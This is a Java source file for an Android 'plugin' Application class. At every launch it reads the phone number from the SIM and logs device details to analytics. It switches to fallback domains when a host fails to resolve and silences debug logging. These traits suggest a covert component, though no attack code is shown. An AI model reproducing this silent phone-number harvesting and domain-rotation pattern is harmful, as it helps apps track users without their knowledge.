package com.xstd.plugin.app;

import android.app.Application;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsConfig;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.plugin.internet.core.HttpConnectHookListener;
import com.plugin.internet.core.impl.JsonErrorResponse;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.io.File;
import java.util.Calendar;
import java.util.HashMap;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:35
 * To change this template use File | Settings | File Templates.
 */
public class PluginApp extends Application {


    @Override
    public void onCreate() {
        super.onCreate();

        initUMeng();

        SettingManager.getInstance().init(getApplicationContext());
        if (SettingManager.getInstance().getFirstLanuchTime() == 0) {
            SettingManager.getInstance().setFirstLanuchTime(System.currentTimeMillis());
        }

        //若果手机号是空，尝试从SIM卡中获取一次
        //每次启动的时候都获取一下
        if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
            if (AppRuntime.isSIMCardReady(getApplicationContext())) {
                String phoneNum = AppRuntime.getPhoneNumber(getApplicationContext());
                if (!TextUtils.isEmpty(phoneNum)) {
                    SettingManager.getInstance().setCurrentPhoneNumber(phoneNum);

                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("osVersion", Build.VERSION.RELEASE);
                    log.put("phoneType", Build.MODEL);
                    log.put("network", AppRuntime.getNetworkTypeNameByIMSI(getApplicationContext()));
                    CommonUtil.umengLog(getApplicationContext(), "get_phone_number_for_sim", log);
                }
            }
        }

        String path = getFilesDir().getAbsolutePath() + "/" + Config.ACTIVE_RESPONSE_FILE;
        AppRuntime.RESPONSE_SAVE_FILE = path;

        UtilsConfig.init(this.getApplicationContext());

        InternetUtils.setHttpHookListener(getApplicationContext(), new HttpConnectHookListener() {

            @Override
            public void onPreHttpConnect(String baseUrl, String method, Bundle requestParams) {
            }

            @Override
            public void onPostHttpConnect(String result, int httpStatus) {
            }

            @Override
            public void onHttpConnectError(int code, String data, Object obj) {
                if (code == JsonErrorResponse.UnknownHostException) {
                    if (Config.DEBUG) {
                        Config.LOGD("[[setHttpHookListener::onHttpConnectError]] Error info : " + data);
                    }

                    String d = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
//                    DomanManager.getInstance(getApplicationContext()).costOneDomain(d);

                    //notify umeng
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("failed_domain", d);
                    log.put("phoneType", Build.MODEL);
                    CommonUtil.umengLog(getApplicationContext(), "domain_failed", log);
                }
            }
        });

        AppRuntime.readActiveResponse(path);
        String type = String.valueOf(AppRuntime.getNetworkTypeByIMSI(getApplicationContext()));
        if (AppRuntime.ACTIVE_RESPONSE == null
                || TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.channelName)
                || !type.equals(AppRuntime.ACTIVE_RESPONSE.operator)) {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginApp::onCreate]] delete old response save file as the data is error. " +
                                " Create PluginApp For Process : " + UtilsRuntime.getCurProcessName(getApplicationContext()) + "<><><><>");
            }
            AppRuntime.ACTIVE_RESPONSE = null;
            File file = new File(path);
            file.delete();
        }
    }

    private void initUMeng() {
        MobclickAgent.setSessionContinueMillis(30 * 1000);
        MobclickAgent.setDebugMode(false);
        com.umeng.common.Log.LOG = false;
        MobclickAgent.onError(this);

        MobclickAgent.flush(this);
    }

}
